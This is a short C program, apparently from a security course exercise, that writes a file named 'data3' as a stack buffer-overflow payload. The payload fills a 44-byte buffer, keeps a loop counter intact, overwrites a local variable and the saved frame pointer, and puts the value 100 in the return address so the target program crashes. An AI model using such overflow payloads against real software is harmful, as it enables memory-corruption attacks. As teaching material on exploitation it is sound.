#include <stdio.h>


/* @author Sundorius */


int main(void)
{
	/* the crash of the program is successful by puting an address of the operating system as the return address. */

	FILE *file = fopen("data3", "w");
	fputs("11111111112222222222333333333344444444445555",file); /* Write in buff
																from position 0 - 43. */
	putc(44,file);  /* Put the number 44 to i, to continue the loop normally
					(we don't care about the i here) */
	fputs("11112222",file);  /* Write the c and the old ebp. */
	putc(100,file);  /* Put the value 100 in the return address. */
	fclose(file);	
	return 0;
}